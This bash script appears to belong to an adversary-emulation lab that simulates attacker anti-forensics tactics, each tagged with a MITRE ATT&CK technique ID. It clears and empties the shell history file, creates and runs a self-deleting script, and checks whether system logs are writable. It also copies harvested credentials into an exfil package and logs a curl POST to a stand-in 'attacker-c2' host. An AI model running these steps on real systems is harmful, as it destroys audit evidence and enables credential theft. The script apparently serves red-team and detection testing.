#!/usr/bin/env bash
# T1070.003 / T1070.006 / T1070.004 — anti-forensics
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "${SCRIPT_DIR}/lib/common.sh"
require_lab

log "Clearing shell history (T1070.003)"
history -c 2>/dev/null || true
HISTFILE="${HISTFILE:-${HOME}/.bash_history}"
: > "${HISTFILE}"
history -w 2>/dev/null || true
log "History cleared: ${HISTFILE}"

log "Simulating log tampering (T1070.006) — dry-run"
for logfile in /var/log/syslog /var/log/auth.log /var/log/messages; do
  if [[ -w "${logfile}" ]]; then
    warn "Writable log found: ${logfile} (would truncate in real attack)"
  else
    echo "protected: ${logfile}" >> "${EVASION_STAGING}/log-status.txt"
  fi
done

log "Self-deleting staging script (T1070.004)"
SELF_DELETE="${EVASION_STAGING}/run-once.sh"
cat > "${SELF_DELETE}" <<'EOF'
#!/bin/bash
echo "payload executed"
rm -f "$0"
EOF
chmod +x "${SELF_DELETE}"
bash "${SELF_DELETE}"
[[ ! -f "${SELF_DELETE}" ]] && log "Self-delete confirmed" || warn "Self-delete failed"

log "Credential exfil staging (T1074.001 / T1048)"
if [[ -f /tmp/teamtnt-staging/harvested-creds.txt ]]; then
  cp /tmp/teamtnt-staging/harvested-creds.txt "${EVASION_STAGING}/exfil-package.txt"
  log "Staged creds for exfil demo: ${EVASION_STAGING}/exfil-package.txt"
  log "Would: curl -X POST https://attacker-c2/exfil -d @exfil-package.txt"
fi
